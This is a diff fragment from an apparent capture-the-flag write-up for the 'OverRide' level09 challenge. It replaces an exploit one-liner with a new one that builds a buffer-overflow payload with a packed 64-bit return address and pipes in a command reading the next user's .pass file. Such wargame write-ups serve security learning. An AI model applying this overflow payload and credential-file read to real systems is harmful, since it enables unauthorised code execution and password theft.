@@ -23,7 +23,7 @@ At first glance, return address must be overwritten in order to redirect flow of
 
 # Exploit
 ```sh
-level09@OverRide:~$ (python -c "import struct; print('\xff'*50 + '\n' + '\x55'*200 + struct.pack('I', 0x5555488c) + struct.pack('I', 0x5555))"; echo 'cat /home/users/$(whoami)/.pass') | ./level09
+level09@OverRide:~$ (python -c "import struct; print('\xff'*50 + '\n' + '\x55'*200 + struct.pack('Q', 0x55555555488c))"; echo 'cat /home/users/$(whoami)/.pass') | ./level09
 --------------------------------------------
 |   ~Welcome to l33t-m$n ~    v1337        |
 --------------------------------------------
